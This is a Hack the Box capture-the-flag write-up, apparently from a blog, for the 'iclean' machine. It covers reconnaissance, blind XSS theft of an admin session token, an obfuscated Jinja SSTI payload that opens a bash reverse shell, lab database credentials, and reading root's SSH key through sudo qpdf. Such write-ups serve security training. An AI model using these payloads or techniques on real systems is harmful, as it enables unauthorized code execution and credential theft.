---
id: index
aliases: []
tags:
  - CTF
  - Hack the Box
authors:
  - paixao
date: "2024-08-20"
draft: false
showAuthor: false
showAuthorsBadges: false
summary: Solution for the Hack the Box machine perfection
title: Hack the Box - iclean
---

## Reconnaissance

Initially, we performed the mapping of open ports on our target, as well as their services and versions.

```config
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http    Apache httpd 2.4.52 ((Ubuntu))
```

When trying to access the WEB server, we are redirected to the domain capiclean.htb. Therefore, we add the following line to our /etc/hosts file so that this domain can be resolved.

```python
 echo "10.10.11.12 capiclean.htb" | sudo tee -a /etc/hosts
```

After accessing the application and performing a search for vulnerabilities, we encountered the endpoint "<http://capiclean.htb/quote>" which brought a suspicious message:

```text
Your quote request was sent our management team. They will reach out soon via e-mail. Thanks for the interest you have shown in our services
```

Upon reading this message, we automatically checked if any parameter of the request sent to the admin was vulnerable to XSS, because if that were the case, we could exfiltrate their token and use the app with maximum privilege.

![Blind XSS ](blind-xss.png)

We used the above payload to send the admin's session token to a web server that we set up with Python using the command

```python
python3 -m http.server
```

As a result of this process, we obtained the admin's session token
![Receiving the token](get-token.png)

## Initial Access

With the token in hand, we enumerated a few more endpoints of the application

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3- medium.txt:FFUZ -u http://capiclean.htb/FFUZ
```

And we found the 'dashboard' endpoint which has restricted access. Thus, we added the admin cookie in the browser and managed to access the endpoint.

Following the application's 'happy path' we generated an invoice, and later tried to access it through the QR code generation function. Analyzing the request parameters, we identified an SSTI in the 'qr_link' parameter.

![SSTI](SSTI.png)

Once we identified this vulnerability, we started testing with various payloads to get a reverse shell. The following payload was the one that allowed us to access the system.

```python
 {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("bash -c '/bin/bash -i >& /dev/tcp/Your-IP/4444 0>&1'")|attr("read")()}}
```

## Privilege Escalation

Once we managed to execute code on the target machine, we performed a scan of its infrastructure. We started with the application's source code. In it, we found some database credentials:

```python
db_config = {
'host': '127.0.0.1',
'user': 'iclean',
'password': 'pxCsmnGLckUb',
'database': 'capiclean'
}
```

When checking the open ports on the application, it was noticed that port 3306 was open, indicating that there is a MySQL database running. With this information, we used the credentials previously found in the code to gain access to the database data.

```bash
mysql --database capiclean -e 'show databases;' -u iclean -p
```

After that, we tried to crack both hashes and succeeded in cracking only the hash of the user 'consuela' which resulted in the password 'simple and clean'. With the password and the user, we attempted logins via SSH.

```bash
ssh consuela@$rhost
```

Which was successful. Now with the SSH shell, we checked if any command was enabled to be executed with sudo privileges.

```bash
sudo -l
```

After understanding what the application is about, we made the following assumption: if the user consuela has SSH, the root user must also have SSH. With their private key stored in the file /root/.ssh/id_rsa, we could create a PDF with the content of the root user's SSH key and direct this PDF to an accessible directory.

```bash
 sudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa
```

After the assumption proved to be true, we retrieved the SSH key by checking the internal content of the PDF, and we logged in as root using the command.

```bash
ssh root@$rhost -i root_ssh_key_file
```

With this, we have access to the root user and can see the final flag.

```bash
cat root.txt
```
